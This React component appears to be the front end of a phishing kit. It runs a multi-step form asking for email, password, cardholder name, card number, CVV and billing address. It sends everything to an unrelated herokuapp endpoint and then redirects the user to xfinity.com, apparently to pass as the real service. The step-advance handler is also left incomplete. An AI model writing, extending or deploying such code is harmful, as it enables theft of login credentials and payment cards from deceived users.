import React, { useState } from 'react';
import Login from './Login';
import Password from './Password';
import BillingInfo from './BillingInfo';

const FormContainer = () => {
  const [step, setStep] = useState(1); // Track the current step
  const [errors, setErrors] = useState({});
  const [formData, setFormData] = useState({
    email: '',
    password: '',
    nameOnCard: '',
    cardNumber: '',
    cvv: '',
    streetAddress: '',
    city: '',
    state: '',
    postalCode: '',
    country: '',
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  

  // Validation function for checking if the current step's inputs are filled
  const isStepValid = () => {

    const newErrors = {};

    switch (step) {
      case 1:
        if (!formData.email) newErrors.email = 'Email is required.';
        if (!formData.password) newErrors.password = 'Password is required.';
        break;
      case 2:
        if (!formData.nameOnCard) newErrors.nameOnCard = 'Name on card is required.';
        if (!formData.cardNumber) newErrors.cardNumber = 'Card number is required.';
        if (!formData.cvv) newErrors.cvv = 'CVV is required.';
        break;
      case 3:
        if (!formData.streetAddress) newErrors.streetAddress = 'Street address is required.';
        if (!formData.city) newErrors.city = 'City is required.';
        if (!formData.state) newErrors.state = 'State is required.';
        if (!formData.postalCode) newErrors.postalCode = 'Postal code is required.';
        if (!formData.country) newErrors.country = 'Country is required.';
        break;
      default:
        break;
    }
  
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0; // Valid if no errors
  };
  

  const handleNext = () => {
    if (!isStepValid()) {
      return;
    }
  
 
  };

  const handleSubmit = async (e) => {
    e.preventDefault(); // Prevent default form submission
  
    if (!isStepValid()) {
      alert('Please fill in all fields before submitting.');
      return;
    }
  
    console.log('Submitting form with data:', formData); // Log the form data
  
    try {
      const response = await fetch(
        'https://shielded-island-46547-e694e2bd0c22.herokuapp.com/api/submit',
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(formData),
        }
      );
  
      const data = await response.json();
      console.log(data);
  
      if (data.success) {
        alert('Message sent successfully!');
        // Navigate to another website
        window.location.href = 'https://xfinity.com'; // Replace with your desired URL
      } else {
        alert('Error: ' + data.message);
      }
    } catch (error) {
      console.error('Error submitting form:', error);
    }
  };
  

  return (
    <form
      onSubmit={(e) => {
        e.preventDefault();
        step === 3 ? handleSubmit(e) : handleNext();
      }}
    >
      {step === 1 && (
        <Login formData={formData} handleChange={handleChange} handleNext={handleNext} errors={errors}/>
      )}
      {step === 2 && (
        <Password formData={formData} handleChange={handleChange} handleNext={handleNext} errors={errors} />
      )}
      {step === 3 && (
        <BillingInfo
          formData={formData}
          handleChange={handleChange}
          handleSubmit={handleSubmit} // Pass handleSubmit to BillingInfo
          errors={errors}
        />
      )}
    </form>
  );
};

export default FormContainer;
